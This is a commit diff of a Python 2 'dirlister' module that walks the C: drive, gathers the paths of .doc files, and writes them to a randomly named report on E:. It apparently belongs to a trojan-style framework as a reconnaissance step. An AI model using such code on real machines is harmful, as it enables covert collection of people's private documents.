84f61350abf59c8020feff4b1111e2f242822be1
PT <phuthong01@protonmail.com>
2018-08-07 20:04:18 +0700

    Adjusting dirlister

--- Mod/dirlister.py
+++ Mod/dirlister.py
@@ -1,20 +1,20 @@
-import os, datetime, random
+import os, datetime, random, fnmatch
+
 
 def run(**args):
 
-    data = ""
-    report_name = str(random.randint(1,100000)) + '.txt'
+    doc_path = ""
+    doc_type = ".doc"
+    report_name = str(random.randint(1, 100000)) + '.txt'
     report_path = os.path.join('E:\\', report_name)
     print "[*] In dirlister module."
     for parent, directories, filenames in os.walk("C:\\"):
-        for filename in filenames:
-            data += str(os.path.join(parent, filename)) + "/n"
-        
-        for directory in directories:
-            data += str(os.path.join(parent, directory)) + "/n"
-        
+        for filename in fnmatch.filter(filenames, "*%s" % doc_type):
+            doc_path += str(os.path.join(parent, filename))
+
     with open(report_path, 'w') as f:
-        f.write(str(data))
-    
+        f.write(str(datetime.datetime.now()))
+        f.write(str(doc_path))
+
     f.close()
     return report_path, report_name
